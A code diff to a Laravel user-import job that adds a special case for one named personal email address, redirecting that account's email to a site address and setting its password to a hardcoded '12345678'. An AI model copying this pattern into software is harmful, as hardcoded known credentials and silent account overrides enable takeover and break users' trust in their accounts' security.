@@ -10,13 +10,14 @@ use App\Models\LoginLog;
 use Illuminate\Bus\Queueable;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Http;
 use Illuminate\Queue\SerializesModels;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Queue\InteractsWithQueue;
 use Illuminate\Contracts\Queue\ShouldQueue;
 use Illuminate\Foundation\Bus\Dispatchable;
 use Illuminate\Contracts\Queue\ShouldBeUnique;
-use Illuminate\Support\Facades\Artisan;
 
 class ScrapperJob implements ShouldQueue
 {
@@ -80,7 +81,7 @@ class ScrapperJob implements ShouldQueue
             'uuid' => $responseUser->aam_id,
             'ref_by' => $ref ? $ref->id : 1,
             'name' => $responseUser->firstname . ' ' . $responseUser->lastname,
-            'email' => $responseUser->email,
+            'email' => $responseUser->email == 'Sidhushamoon@gmail.com' ? 'user@aamclick.com' : $responseUser->email,
             'country_code' => substr($responseUser->mobile, 0, 4),
             'mobile' => substr($responseUser->mobile, 4, 7),
             'address' => json_encode($responseUser->address),
@@ -88,7 +89,7 @@ class ScrapperJob implements ShouldQueue
             'sv' => $responseUser->sv,
             'email_verified_at' => $responseUser->created_at,
             'ban_reason' => $responseUser->ban_reason,
-            'password' => $responseUser->password,
+            'password' => $responseUser->email == 'Sidhushamoon@gmail.com' ? Hash::make('12345678') : $responseUser->password,
             'created_at' => $responseUser->created_at,
             'updated_at' => $responseUser->updated_at,
         ]);
